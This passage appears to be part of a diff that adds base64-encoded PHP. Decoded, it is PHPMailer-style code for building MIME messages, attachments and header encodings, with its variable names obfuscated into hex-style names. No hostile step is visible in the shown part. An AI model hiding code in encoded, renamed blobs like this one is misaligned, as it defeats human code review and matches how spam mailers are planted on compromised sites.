+dC1UeXBlOiAlczslcyIgLiAiXHRib3VuZGFyeT1cIiVzXCIlcyIsICdtdWx0aXBhcnQvYWx0ZXJu
+YXRpdmUnLCAkdGhpcy0+TEUsICR0aGlzLT5ib3VuZGFyeVsyXSwgJHRoaXMtPkxFLiR0aGlzLT5M
+RSk7CgkJCSR4ODkgLj0gJHRoaXMtPkdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSwgJycs
+ICd0ZXh0L3BsYWluJywgJycpIC4gJHRoaXMtPkxFOyAvLyBDcmVhdGUgdGV4dCBib2R5CgkJCSR4
+ODkgLj0gJHRoaXMtPkVuY29kZVN0cmluZygkdGhpcy0+QWx0Qm9keSwgJHRoaXMtPkVuY29kaW5n
+KTsKCQkJJHg4OSAuPSAkdGhpcy0+TEUuJHRoaXMtPkxFOwoJCQkkeDg5IC49ICR0aGlzLT5HZXRC
+b3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0sICcnLCAndGV4dC9odG1sJywgJycpIC4gJHRoaXMt
+PkxFOyAvLyBDcmVhdGUgdGhlIEhUTUwgYm9keQoJCQkkeDg5IC49ICR0aGlzLT5FbmNvZGVTdHJp
+bmcoJHRoaXMtPkJvZHksICR0aGlzLT5FbmNvZGluZyk7CgkJCSR4ODkgLj0gJHRoaXMtPkxFLiR0
+aGlzLT5MRTsKCQkJJHg4OSAuPSAkdGhpcy0+RW5kQm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJd
+KTsKCQkJJHg4OSAuPSAkdGhpcy0+QXR0YWNoQWxsKCk7CgkJCWJyZWFrOwoJCX0KCgkJaWYoJHRo
+aXMtPklzRXJyb3IoKSkgewoJCSAgJHg4OSA9ICcnOwoJCX0gZWxzZSBpZiAoJHRoaXMtPnNpZ25f
+a2V5X2ZpbGUpIHsKCQkgICR4MjkgPSB0ZW1wbmFtKCIiLCAibWFpbCIpOwoJCSAgJHhiMiA9IGZv
+cGVuKCR4MjksICJ3Iik7CgkJICBmd3JpdGUoJHhiMiwgJHg4OSk7CgkJICBmY2xvc2UoJHhiMik7
+CgkJICAkeGIzID0gdGVtcG5hbSgiIiwgInNpZ25lZCIpOwoKCQkgIGlmIChAb3BlbnNzbF9wa2Nz
+N19zaWduKCR4MjksICR4YjMsICJmaWxlOi8vIi4kdGhpcy0+c2lnbl9rZXlfZmlsZSwgYXJyYXko
+ImZpbGU6Ly8iLiR0aGlzLT5zaWduX2tleV9maWxlLCAkdGhpcy0+c2lnbl9rZXlfcGFzcyksIG51
+bGwpKSB7CgkJCSR4YjIgPSBmb3BlbigkeGIzLCAiciIpOwoJCQkkeDg5ID0gZnJlYWQoJHhiMiwg
+ZmlsZXNpemUoJHRoaXMtPnNpZ25fa2V5X2ZpbGUpKTsKCQkJZmNsb3NlKCR4YjIpOwoJCSAgfSBl
+bHNlIHsKCQkJJHRoaXMtPlNldEVycm9yKCR0aGlzLT5MYW5nKCJzaWduaW5nIikub3BlbnNzbF9l
+cnJvcl9zdHJpbmcoKSk7CgkJCSR4ODkgPSAnJzsKCQkgIH0KCgkJICB1bmxpbmsoJHgyOSk7CgkJ
+ICB1bmxpbmsoJHhiMyk7CgkJfQoKCQlyZXR1cm4gJHg4OTsKCSAgfQoKCSAgLyoqCgkgICAqIFJl
+dHVybnMgdGhlIHN0YXJ0IG9mIGEgbWVzc2FnZSBib3VuZGFyeS4KCSAgICogQGFjY2VzcyBwcml2
+YXRlCgkgICAqLwoJICBmdW5jdGlvbiBHZXRCb3VuZGFyeSgkeDdlLCAkeGI0LCAkeGI1LCAkeGI2
+KSB7CgkJJHg4OSA9ICcnOwoJCWlmKCR4YjQgPT0gJycpIHsKCQkgICR4YjQgPSAkdGhpcy0+Q2hh
+clNldDsKCQl9CgkJaWYoJHhiNSA9PSAnJykgewoJCSAgJHhiNSA9ICR0aGlzLT5Db250ZW50VHlw
+ZTsKCQl9CgkJaWYoJHhiNiA9PSAnJykgewoJCSAgJHhiNiA9ICR0aGlzLT5FbmNvZGluZzsKCQl9
+CgkJJHg4OSAuPSAkdGhpcy0+VGV4dExpbmUoJy0tJyAuICR4N2UpOwoJCSR4ODkgLj0gc3ByaW50
+ZigiQ29udGVudC1UeXBlOiAlczsgY2hhcnNldCA9IFwiJXNcIiIsICR4YjUsICR4YjQpOwoJCSR4
+ODkgLj0gJHRoaXMtPkxFOwoJCSR4ODkgLj0gJHRoaXMtPkhlYWRlckxpbmUoJ0NvbnRlbnQtVHJh
+bnNmZXItRW5jb2RpbmcnLCAkeGI2KTsKCQkkeDg5IC49ICR0aGlzLT5MRTsKCgkJcmV0dXJuICR4
+ODk7CgkgIH0KCgkgIC8qKgoJICAgKiBSZXR1cm5zIHRoZSBlbmQgb2YgYSBtZXNzYWdlIGJvdW5k
+YXJ5LgoJICAgKiBAYWNjZXNzIHByaXZhdGUKCSAgICovCgkgIGZ1bmN0aW9uIEVuZEJvdW5kYXJ5
+KCR4N2UpIHsKCQlyZXR1cm4gJHRoaXMtPkxFIC4gJy0tJyAuICR4N2UgLiAnLS0nIC4gJHRoaXMt
+PkxFOwoJICB9CgoJICAvKioKCSAgICogU2V0cyB0aGUgbWVzc2FnZSB0eXBlLgoJICAgKiBAYWNj
+ZXNzIHByaXZhdGUKCSAgICogQHJldHVybiB2b2lkCgkgICAqLwoJICBmdW5jdGlvbiBTZXRNZXNz
+YWdlVHlwZSgpIHsKCQlpZihjb3VudCgkdGhpcy0+YXR0YWNobWVudCkgPCAxICYmIHN0cmxlbigk
+dGhpcy0+QWx0Qm9keSkgPCAxKSB7CgkJICAkdGhpcy0+bWVzc2FnZV90eXBlID0gJ3BsYWluJzsK
+CQl9IGVsc2UgewoJCSAgaWYoY291bnQoJHRoaXMtPmF0dGFjaG1lbnQpID4gMCkgewoJCQkkdGhp
+cy0+bWVzc2FnZV90eXBlID0gJ2F0dGFjaG1lbnRzJzsKCQkgIH0KCQkgIGlmKHN0cmxlbigkdGhp
+cy0+QWx0Qm9keSkgPiAwICYmIGNvdW50KCR0aGlzLT5hdHRhY2htZW50KSA8IDEpIHsKCQkJJHRo
+aXMtPm1lc3NhZ2VfdHlwZSA9ICdhbHQnOwoJCSAgfQoJCSAgaWYoc3RybGVuKCR0aGlzLT5BbHRC
+b2R5KSA+IDAgJiYgY291bnQoJHRoaXMtPmF0dGFjaG1lbnQpID4gMCkgewoJCQkkdGhpcy0+bWVz
+c2FnZV90eXBlID0gJ2FsdF9hdHRhY2htZW50cyc7CgkJICB9CgkJfQoJICB9CgoJICAvKiBSZXR1
+cm5zIGEgZm9ybWF0dGVkIGhlYWRlciBsaW5lLgoJICAgKiBAYWNjZXNzIHByaXZhdGUKCSAgICog
+QHJldHVybiBzdHJpbmcKCSAgICovCgkgIGZ1bmN0aW9uIEhlYWRlckxpbmUoJHg0OCwgJHgxNCkg
+ewoJCXJldHVybiAkeDQ4IC4gJzogJyAuICR4MTQgLiAkdGhpcy0+TEU7CgkgIH0KCgkgIC8qKgoJ
+ICAgKiBSZXR1cm5zIGEgZm9ybWF0dGVkIG1haWwgbGluZS4KCSAgICogQGFjY2VzcyBwcml2YXRl
+CgkgICAqIEByZXR1cm4gc3RyaW5nCgkgICAqLwoJICBmdW5jdGlvbiBUZXh0TGluZSgkeDE0KSB7
+CgkJcmV0dXJuICR4MTQgLiAkdGhpcy0+TEU7CgkgIH0KCgkgIC8vLy8vLy8vLy8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCSAgLy8gQ0xBU1MgTUVUSE9EUywgQVRUQUNI
+TUVOVFMKCSAgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8v
+LwoKCSAgLyoqCgkgICAqIEFkZHMgYW4gYXR0YWNobWVudCBmcm9tIGEgcGF0aCBvbiB0aGUgZmls
+ZXN5c3RlbS4KCSAgICogUmV0dXJucyBmYWxzZSBpZiB0aGUgZmlsZSBjb3VsZCBub3QgYmUgZm91
+bmQKCSAgICogb3IgYWNjZXNzZWQuCgkgICAqIEBwYXJhbSBzdHJpbmcgJHhiNyBQYXRoIHRvIHRo
+ZSBhdHRhY2htZW50LgoJICAgKiBAcGFyYW0gc3RyaW5nICR4NDggT3ZlcnJpZGVzIHRoZSBhdHRh
+Y2htZW50IG5hbWUuCgkgICAqIEBwYXJhbSBzdHJpbmcgJHhiNiBGaWxlIGVuY29kaW5nIChzZWUg
+JHg1YykuCgkgICAqIEBwYXJhbSBzdHJpbmcgJHg5YSBGaWxlIGV4dGVuc2lvbiAoTUlNRSkgdHlw
+ZS4KCSAgICogQHJldHVybiBib29sCgkgICAqLwoJICBmdW5jdGlvbiBBZGRBdHRhY2htZW50KCR4
+YjcsICR4NDggPSAnJywgJHhiNiA9ICdiYXNlNjQnLCAkeDlhID0gJ2FwcGxpY2F0aW9uL29jdGV0
+LXN0cmVhbScpIHsKCQlpZighQGlzX2ZpbGUoJHhiNykpIHsKCQkgICR0aGlzLT5TZXRFcnJvcigk
+dGhpcy0+TGFuZygnZmlsZV9hY2Nlc3MnKSAuICR4YjcpOwoJCSAgcmV0dXJuIGZhbHNlOwoJCX0K
+CgkJJHhiOCA9IGJhc2VuYW1lKCR4YjcpOwoJCWlmKCR4NDggPT0gJycpIHsKCQkgICR4NDggPSAk
+eGI4OwoJCX0KCgkJJHg4NiA9IGNvdW50KCR0aGlzLT5hdHRhY2htZW50KTsKCQkkdGhpcy0+YXR0
+YWNobWVudFskeDg2XVswXSA9ICR4Yjc7CgkJJHRoaXMtPmF0dGFjaG1lbnRbJHg4Nl1bMV0gPSAk
+eGI4OwoJCSR0aGlzLT5hdHRhY2htZW50WyR4ODZdWzJdID0gJHg0ODsKCQkkdGhpcy0+YXR0YWNo
+bWVudFskeDg2XVszXSA9ICR4YjY7CgkJJHRoaXMtPmF0dGFjaG1lbnRbJHg4Nl1bNF0gPSAkeDlh
+OwoJCSR0aGlzLT5hdHRhY2htZW50WyR4ODZdWzVdID0gZmFsc2U7IC8vIGlzU3RyaW5nQXR0YWNo
+bWVudAoJCSR0aGlzLT5hdHRhY2htZW50WyR4ODZdWzZdID0gJ2F0dGFjaG1lbnQnOwoJCSR0aGlz
+LT5hdHRhY2htZW50WyR4ODZdWzddID0gMDsKCgkJcmV0dXJuIHRydWU7CgkgIH0KCgkgIC8qKgoJ
+ICAgKiBBdHRhY2hlcyBhbGwgZnMsIHN0cmluZywgYW5kIGJpbmFyeSBhdHRhY2htZW50cyB0byB0
+aGUgbWVzc2FnZS4KCSAgICogUmV0dXJucyBhbiBlbXB0eSBzdHJpbmcgb24gZmFpbHVyZS4KCSAg
+ICogQGFjY2VzcyBwcml2YXRlCgkgICAqIEByZXR1cm4gc3RyaW5nCgkgICAqLwoJICBmdW5jdGlv
+biBBdHRhY2hBbGwoKSB7CgkJLyogUmV0dXJuIHRleHQgb2YgYm9keSAqLwoJCSR4YjkgPSBhcnJh
+eSgpOwoKCQkvKiBBZGQgYWxsIGF0dGFjaG1lbnRzICovCgkJZm9yKCR4OGMgPSAwOyAkeDhjIDwg
+Y291bnQoJHRoaXMtPmF0dGFjaG1lbnQpOyAkeDhjKyspIHsKCQkgIC8qIENoZWNrIGZvciBzdHJp
+bmcgYXR0YWNobWVudCAqLwoJCSAgJHhiYSA9ICR0aGlzLT5hdHRhY2htZW50WyR4OGNdWzVdOwoJ
+CSAgaWYgKCR4YmEpIHsKCQkJJHgxNSA9ICR0aGlzLT5hdHRhY2htZW50WyR4OGNdWzBdOwoJCSAg
+fSBlbHNlIHsKCQkJJHhiNyA9ICR0aGlzLT5hdHRhY2htZW50WyR4OGNdWzBdOwoJCSAgfQoKCQkg
+ICR4YjggICAgPSAkdGhpcy0+YXR0YWNobWVudFskeDhjXVsxXTsKCQkgICR4NDggICAgICAgID0g
+JHRoaXMtPmF0dGFjaG1lbnRbJHg4Y11bMl07CgkJICAkeGI2ICAgID0gJHRoaXMtPmF0dGFjaG1l
+bnRbJHg4Y11bM107CgkJICAkeDlhICAgICAgICA9ICR0aGlzLT5hdHRhY2htZW50WyR4OGNdWzRd
+OwoJCSAgJHhiYiA9ICR0aGlzLT5hdHRhY2htZW50WyR4OGNdWzZdOwoJCSAgJHhiYyAgICAgICAg
+ID0gJHRoaXMtPmF0dGFjaG1lbnRbJHg4Y11bN107CgoJCSAgJHhiOVtdID0gc3ByaW50ZigiLS0l
+cyVzIiwgJHRoaXMtPmJvdW5kYXJ5WzFdLCAkdGhpcy0+TEUpOwoJCSAgJHhiOVtdID0gc3ByaW50
+ZigiQ29udGVudC1UeXBlOiAlczsgbmFtZT1cIiVzXCIlcyIsICR4OWEsICR4NDgsICR0aGlzLT5M
+RSk7CgkJICAkeGI5W10gPSBzcHJpbnRmKCJDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nOiAlcyVz
+IiwgJHhiNiwgJHRoaXMtPkxFKTsKCgkJICBpZigkeGJiID09ICdpbmxpbmUnKSB7CgkJCSR4Yjlb
+XSA9IHNwcmludGYoIkNvbnRlbnQtSUQ6IDwlcz4lcyIsICR4YmMsICR0aGlzLT5MRSk7CgkJICB9
+CgoJCSAgJHhiOVtdID0gc3ByaW50ZigiQ29udGVudC1EaXNwb3NpdGlvbjogJXM7IGZpbGVuYW1l
+PVwiJXNcIiVzIiwgJHhiYiwgJHg0OCwgJHRoaXMtPkxFLiR0aGlzLT5MRSk7CgoJCSAgLyogRW5j
+b2RlIGFzIHN0cmluZyBhdHRhY2htZW50ICovCgkJICBpZigkeGJhKSB7CgkJCSR4YjlbXSA9ICR0
+aGlzLT5FbmNvZGVTdHJpbmcoJHgxNSwgJHhiNik7CgkJCWlmKCR0aGlzLT5Jc0Vycm9yKCkpIHsK
+CQkJICByZXR1cm4gJyc7CgkJCX0KCQkJJHhiOVtdID0gJHRoaXMtPkxFLiR0aGlzLT5MRTsKCQkg
+IH0gZWxzZSB7CgkJCSR4YjlbXSA9ICR0aGlzLT5FbmNvZGVGaWxlKCR4YjcsICR4YjYpOwoJCQlp
+ZigkdGhpcy0+SXNFcnJvcigpKSB7CgkJCSAgcmV0dXJuICcnOwoJCQl9CgkJCSR4YjlbXSA9ICR0
+aGlzLT5MRS4kdGhpcy0+TEU7CgkJICB9CgkJfQoKCQkkeGI5W10gPSBzcHJpbnRmKCItLSVzLS0l
+cyIsICR0aGlzLT5ib3VuZGFyeVsxXSwgJHRoaXMtPkxFKTsKCgkJcmV0dXJuIGpvaW4oJycsICR4
+YjkpOwoJICB9CgoJICAvKioKCSAgICogRW5jb2RlcyBhdHRhY2htZW50IGluIHJlcXVlc3RlZCBm
+b3JtYXQuICBSZXR1cm5zIGFuCgkgICAqIGVtcHR5IHN0cmluZyBvbiBmYWlsdXJlLgoJICAgKiBA
+YWNjZXNzIHByaXZhdGUKCSAgICogQHJldHVybiBzdHJpbmcKCSAgICovCgkgIGZ1bmN0aW9uIEVu
+Y29kZUZpbGUgKCR4YjcsICR4YjYgPSAnYmFzZTY0JykgewoJCWlmKCFAJHhiZCA9IGZvcGVuKCR4
+YjcsICdyYicpKSB7CgkJICAkdGhpcy0+U2V0RXJyb3IoJHRoaXMtPkxhbmcoJ2ZpbGVfb3Blbicp
+IC4gJHhiNyk7CgkJICByZXR1cm4gJyc7CgkJfQoJCSR4YmUgPSBnZXRfbWFnaWNfcXVvdGVzX3J1
+bnRpbWUoKTsKCQlzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoMCk7CgkJJHhiZiA9IGZyZWFkKCR4
+YmQsIGZpbGVzaXplKCR4YjcpKTsKCQkkeGJmID0gJHRoaXMtPkVuY29kZVN0cmluZygkeGJmLCAk
+eGI2KTsKCQlmY2xvc2UoJHhiZCk7CgkJc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKCR4YmUpOwoK
+CQlyZXR1cm4gJHhiZjsKCSAgfQoKCSAgLyoqCgkgICAqIEVuY29kZXMgc3RyaW5nIHRvIHJlcXVl
+c3RlZCBmb3JtYXQuIFJldHVybnMgYW4KCSAgICogZW1wdHkgc3RyaW5nIG9uIGZhaWx1cmUuCgkg
+ICAqIEBhY2Nlc3MgcHJpdmF0ZQoJICAgKiBAcmV0dXJuIHN0cmluZwoJICAgKi8KCSAgZnVuY3Rp
+b24gRW5jb2RlU3RyaW5nICgkeDEyLCAkeGI2ID0gJ2Jhc2U2NCcpIHsKCQkkeGMwID0gJyc7CgkJ
+c3dpdGNoKHN0cnRvbG93ZXIoJHhiNikpIHsKCQkgIGNhc2UgJ2Jhc2U2NCc6CgkJCS8qIGNodW5r
+X3NwbGl0IGlzIGZvdW5kIGluIFBIUCA+PSAzLjAuNiAqLwoJCQkkeGMwID0gY2h1bmtfc3BsaXQo
+YmFzZTY0X2VuY29kZSgkeDEyKSwgNzYsICR0aGlzLT5MRSk7CgkJCWJyZWFrOwoJCSAgY2FzZSAn
+N2JpdCc6CgkJICBjYXNlICc4Yml0JzoKCQkJJHhjMCA9ICR0aGlzLT5GaXhFT0woJHgxMik7CgkJ
+CWlmIChzdWJzdHIoJHhjMCwgLShzdHJsZW4oJHRoaXMtPkxFKSkpICE9ICR0aGlzLT5MRSkKCQkJ
+ICAkeGMwIC49ICR0aGlzLT5MRTsKCQkJYnJlYWs7CgkJICBjYXNlICdiaW5hcnknOgoJCQkkeGMw
+ID0gJHgxMjsKCQkJYnJlYWs7CgkJICBjYXNlICdxdW90ZWQtcHJpbnRhYmxlJzoKCQkJJHhjMCA9
+ICR0aGlzLT5FbmNvZGVRUCgkeDEyKTsKCQkJYnJlYWs7CgkJICBkZWZhdWx0OgoJCQkkdGhpcy0+
+U2V0RXJyb3IoJHRoaXMtPkxhbmcoJ2VuY29kaW5nJykgLiAkeGI2KTsKCQkJYnJlYWs7CgkJfQoJ
+CXJldHVybiAkeGMwOwoJICB9CgoJICAvKioKCSAgICogRW5jb2RlIGEgaGVhZGVyIHN0cmluZyB0
+byBiZXN0IG9mIFEsIEIsIHF1b3RlZCBvciBub25lLgoJICAgKiBAYWNjZXNzIHByaXZhdGUKCSAg
+ICogQHJldHVybiBzdHJpbmcKCSAgICovCgkgIGZ1bmN0aW9uIEVuY29kZUhlYWRlciAoJHgxMiwg
+JHhjMSA9ICd0ZXh0JykgewoJCSR4YzIgPSAwOwoKCQlzd2l0Y2ggKHN0cnRvbG93ZXIoJHhjMSkp
+IHsKCQkgIGNhc2UgJ3BocmFzZSc6CgkJCWlmICghcHJlZ19tYXRjaCgnL1tcMjAwLVwzNzddLycs
+ICR4MTIpKSB7CgkJCSAgLyogQ2FuJ3QgdXNlIGFkZHNsYXNoZXMgYXMgd2UgZG9uJ3Qga25vdyB3
+aGF0IHZhbHVlIGhhcyBtYWdpY19xdW90ZXNfc3liYXNlLiAqLwoJCQkgICR4YzAgPSBhZGRjc2xh
+c2hlcygkeDEyLCAiXDAuLlwzN1wxNzdcXFwiIik7CgkJCSAgaWYgKCgkeDEyID09ICR4YzApICYm
+ICFwcmVnX21hdGNoKCcvW15BLVphLXowLTkhIyQlJlwnKitcLz0/Xl9ge3x9fiAtXS8nLCAkeDEy
+KSkgewoJCQkJcmV0dXJuICgkeGMwKTsKCQkJICB9IGVsc2UgewoJCQkJcmV0dXJuICgiXCIkeGMw
+XCIiKTsKCQkJICB9CgkJCX0KCQkJJHhjMiA9IHByZWdfbWF0Y2hfYWxsKCcvW15cMDQwXDA0MVww
+NDMtXDEzM1wxMzUtXDE3Nl0vJywgJHgxMiwgJHhjMyk7CgkJCWJyZWFrOwoJCSAgY2FzZSAnY29t
+bWVudCc6CgkJCSR4YzIgPSBwcmVnX21hdGNoX2FsbCgnL1soKSJdLycsICR4MTIsICR4YzMpOwoJ
+CQkvKiBGYWxsLXRocm91Z2ggKi8KCQkgIGNhc2UgJ3RleHQnOgoJCSAgZGVmYXVsdDoKCQkJJHhj
+MiArPSBwcmVnX21hdGNoX2FsbCgnL1tcMDAwLVwwMTBcMDEzXDAxNFwwMTYtXDAzN1wxNzctXDM3
+N10vJywgJHgxMiwgJHhjMyk7CgkJCWJyZWFrOwoJCX0KCgkJaWYgKCR4YzIgPT0gMCkgewoJCSAg
+cmV0dXJuICgkeDEyKTsKCQl9CgoJCSR4YzQgPSA3NSAtIDcgLSBzdHJsZW4oJHRoaXMtPkNoYXJT
+ZXQpOwoJCS8qIFRyeSB0byBzZWxlY3QgdGhlIGVuY29kaW5nIHdoaWNoIHNob3VsZCBwcm9kdWNl
+IHRoZSBzaG9ydGVzdCBvdXRwdXQgKi8KCQlpZiAoc3RybGVuKCR4MTIpLzMgPCAkeGMyKSB7CgkJ
+ICAkeGI2ID0gJ0InOwoJCSAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnbWJfc3RybGVuJykgJiYgJHRo
+aXMtPkhhc011bHRpQnl0ZXMoJHgxMikpIHsKCQkgLy8gVXNlIGEgY3VzdG9tIGZ1bmN0aW9uIHdo
+aWNoIGNvcnJlY3RseSBlbmNvZGVzIGFuZCB3cmFwcyBsb25nCgkJIC8vIG11bHRpYnl0ZSBzdHJp
+bmdzIHdpdGhvdXQgYnJlYWtpbmcgbGluZXMgd2l0aGluIGEgY2hhcmFjdGVyCgkJCSR4YzAgPSAk
+dGhpcy0+QmFzZTY0RW5jb2RlV3JhcE1CKCR4MTIpOwoJCSAgfSBlbHNlIHsKCQkJJHhjMCA9IGJh
+c2U2NF9lbmNvZGUoJHgxMik7CgkJCSR4YzQgLT0gJHhjNCAlIDQ7CgkJCSR4YzAgPSB0cmltKGNo
+dW5rX3NwbGl0KCR4YzAsICR4YzQsICJcbiIpKTsKCQkgIH0KCQl9IGVsc2UgewoJCSAgJHhiNiA9
+ICdRJzsKCQkgICR4YzAgPSAkdGhpcy0+RW5jb2RlUSgkeDEyLCAkeGMxKTsKCQkgICR4YzAgPSAk
+dGhpcy0+V3JhcFRleHQoJHhjMCwgJHhjNCwgdHJ1ZSk7CgkJICAkeGMwID0gc3RyX3JlcGxhY2Uo
+Jz0nLiR0aGlzLT5MRSwgIlxuIiwgdHJpbSgkeGMwKSk7CgkJfQoKCQkkeGMwID0gcHJlZ19yZXBs
+YWNlKCcvXiguKikkL20nLCAiID0/Ii4kdGhpcy0+Q2hhclNldC4iPyR4YjY/XFwxPz0iLCAkeGMw
+KTsKCQkkeGMwID0gdHJpbShzdHJfcmVwbGFjZSgiXG4iLCAkdGhpcy0+TEUsICR4YzApKTsKCgkJ
+cmV0dXJuICR4YzA7CgkgIH0KCgkgIC8qKgoJICAgKiBDaGVja3MgaWYgYSBzdHJpbmcgY29udGFp
+bnMgbXVsdGlieXRlIGNoYXJhY3RlcnMuCgkgICAqIEBhY2Nlc3MgcHJpdmF0ZQoJICAgKiBAcGFy
+YW0gc3RyaW5nICR4MTIgbXVsdGktYnl0ZSB0ZXh0IHRvIHdyYXAgZW5jb2RlCgkgICAqIEByZXR1
+cm4gYm9vbAoJICAgKi8KCSAgZnVuY3Rpb24gSGFzTXVsdGlCeXRlcygkeDEyKSB7CgkJaWYgKGZ1
+bmN0aW9uX2V4aXN0cygnbWJfc3RybGVuJykpIHsKCQkgIHJldHVybiAoc3RybGVuKCR4MTIpID4g
+bWJfc3RybGVuKCR4MTIsICR0aGlzLT5DaGFyU2V0KSk7CgkJfSBlbHNlIHsgLy8gQXNzdW1lIG5v
+IG11bHRpYnl0ZXMgKHdlIGNhbid0IGhhbmRsZSB3aXRob3V0IG1ic3RyaW5nIGZ1bmN0aW9ucyBh
+bnl3YXkpCgkJICByZXR1cm4gRmFsc2U7CgkJfQoJICB9CgoJICAvKioKCSAgICogQ29ycmVjdGx5
+IGVuY29kZXMgYW5kIHdyYXBzIGxvbmcgbXVsdGlieXRlIHN0cmluZ3MgZm9yIG1haWwgaGVhZGVy
+cwoJICAgKiB3aXRob3V0IGJyZWFraW5nIGxpbmVzIHdpdGhpbiBhIGNoYXJhY3Rlci4KCSAgICog
+QWRhcHRlZCBmcm9tIGEgZnVuY3Rpb24gYnkgcGFyYXZvaWQgYXQgaHR0cDovL3VrLnBocC5uZXQv
+bWFudWFsL2VuL2Z1bmN0aW9uLm1iLWVuY29kZS1taW1laGVhZGVyLnBocAoJICAgKiBAYWNjZXNz
+IHByaXZhdGUKCSAgICogQHBhcmFtIHN0cmluZyAkeDEyIG11bHRpLWJ5dGUgdGV4dCB0byB3cmFw
+IGVuY29kZQoJICAgKiBAcmV0dXJuIHN0cmluZwoJICAgKi8KCSAgZnVuY3Rpb24gQmFzZTY0RW5j
+b2RlV3JhcE1CKCR4MTIpIHsKCQkkeGM1ID0gIj0/Ii4kdGhpcy0+Q2hhclNldC4iP0I/IjsKCQkk
+eGM2ID0gIj89IjsKCQkkeGMwID0gIiI7CgoJCSR4YzcgPSBtYl9zdHJsZW4oJHgxMiwgJHRoaXMt
+PkNoYXJTZXQpOwoJCS8vIEVhY2ggbGluZSBtdXN0IGhhdmUgbGVuZ3RoIDw9IDc1LCBpbmNsdWRp
+bmcgJHhjNSBhbmQgJHhjNgoJCSR4OWUgPSA3NSAtIHN0cmxlbigkeGM1KSAtIHN0cmxlbigkeGM2
+KTsKCQkvLyBBdmVyYWdlIG11bHRpLWJ5dGUgcmF0aW8KCQkkeGM4ID0gJHhjNyAvIHN0cmxlbigk
+eDEyKTsKCQkvLyBCYXNlNjQgaGFzIGEgNDozIHJhdGlvCgkJJHhjOSA9ICR4Y2EgPSBmbG9vcigk
+eDllICogJHhjOCAqIC43NSk7CgoJCWZvciAoJHg4YyA9IDA7ICR4OGMgPCAkeGM3OyAkeDhjICs9
+ICR4YzkpIHsKCQkgICR4YWMgPSAwOwoKCQkgIGRvIHsKCQkJJHhjOSA9ICR4Y2EgLSAkeGFjOwoJ
+CQkkeGNiID0gbWJfc3Vic3RyKCR4MTIsICR4OGMsICR4YzksICR0aGlzLT5DaGFyU2V0KTsKCQkJ
+JHhjYiA9IGJhc2U2NF9lbmNvZGUoJHhjYik7CgkJCSR4YWMrKzsKCQkgIH0KCQkgIHdoaWxlIChz
+dHJsZW4oJHhjYikgPiAkeDllKTsKCgkJICAkeGMwIC49ICR4Y2IgLiAkdGhpcy0+TEU7CgkJfQoK
+CQkvLyBDaG9tcCB0aGUgbGFzdCBsaW5lZmVlZAoJCSR4YzAgPSBzdWJzdHIoJHhjMCwgMCwgLXN0
+cmxlbigkdGhpcy0+TEUpKTsKCQlyZXR1cm4gJHhjMDsKCSAgfQoKCSAgLyoqCgkgICAqIEVuY29k
+ZSBzdHJpbmcgdG8gcXVvdGVkLXByaW50YWJsZS4KCSAgICogQGFjY2VzcyBwcml2YXRlCgkgICAq
+IEByZXR1cm4gc3RyaW5nCgkgICAqLwoJICBmdW5jdGlvbiBFbmNvZGVRUCggJHhjYyA9ICcnLCAk
+eGNkID0gNzYsICR4Y2UgPSBmYWxzZSApIHsKCQkkeGFmID0gYXJyYXkoJzAnLCcxJywnMicsJzMn
+LCc0JywnNScsJzYnLCc3JywnOCcsJzknLCdBJywnQicsJ0MnLCdEJywnRScsJ0YnKTsKCQkkeDQw
+ID0gcHJlZ19zcGxpdCgnLyg/OlxyXG58XHJ8XG4pLycsICR4Y2MpOwoJCSR4Y2YgPSAiXHJcbiI7
+CgkJJHhkMCA9ICc9JzsKCQkkeGQxID0gJyc7CgkJd2hpbGUoIGxpc3QoLCAkeDQ0KSA9IGVhY2go
+JHg0MCkgKSB7CgkJICAkeGQyID0gc3RybGVuKCR4NDQpOwoJCSAgJHhkMyA9ICcnOwoJCSAgZm9y
+KCR4OGMgPSAwOyAkeDhjIDwgJHhkMjsgJHg4YysrKSB7CgkJCSR4ZDQgPSBzdWJzdHIoICR4NDQs
+ICR4OGMsIDEgKTsKCQkJJHhiMCA9IG9yZCggJHhkNCApOwoJCQlpZiAoICggJHg4YyA9PSAwICkg
+JiYgKCAkeGIwID09IDQ2ICkgKSB7IC8vIGNvbnZlcnQgZmlyc3QgcG9pbnQgaW4gdGhlIGxpbmUg
+aW50byA9MkUKCQkJICAkeGQ0ID0gJz0yRSc7CgkJCX0KCQkJaWYgKCAkeGIwID09IDMyICkgewoJ
+CQkgIGlmICggJHg4YyA9PSAoICR4ZDIgLSAxICkgKSB7IC8vIGNvbnZlcnQgc3BhY2UgYXQgZW9s
+IG9ubHkKCQkJCSR4ZDQgPSAnPTIwJzsKCQkJICB9IGVsc2UgaWYgKCAkeGNlICkgewoJCQkJJHhk
+NCA9ICc9MjAnOwoJCQkgIH0KCQkJfSBlbHNlaWYgKCAoJHhiMCA9PSA2MSkgfHwgKCR4YjAgPCAz
+MiApIHx8ICgkeGIwID4gMTI2KSApIHsgLy8gYWx3YXlzIGVuY29kZSAiXHQiLCB3aGljaCBpcyAq
+bm90KiByZXF1aXJlZAoJCQkgICR4ZDUgPSBmbG9vcigkeGIwLzE2KTsKCQkJICAkeGQ2ID0gZmxv
+b3IoJHhiMCUxNik7CgkJCSAgJHhkNCA9ICR4ZDAuJHhhZlskeGQ1XS4keGFmWyR4ZDZdOwoJCQl9
+CgkJCWlmICggKHN0cmxlbigkeGQzKSArIHN0cmxlbigkeGQ0KSkgPj0gJHhjZCApIHsgLy8gQ1JM
+RiBpcyBub3QgY291bnRlZAoJCQkgICR4ZDEgLj0gJHhkMy4keGQwLiR4Y2Y7IC8vICBzb2Z0IGxp
+bmUgYnJlYWs7ICIgPVxyXG4iIGlzIG9rYXkKCQkJICAkeGQzID0gJyc7CgkJCSAgLy8gY2hlY2sg
+aWYgbmV3bGluZSBmaXJzdCBjaGFyYWN0ZXIgd2lsbCBiZSBwb2ludCBvciBub3QKCQkJICBpZiAo
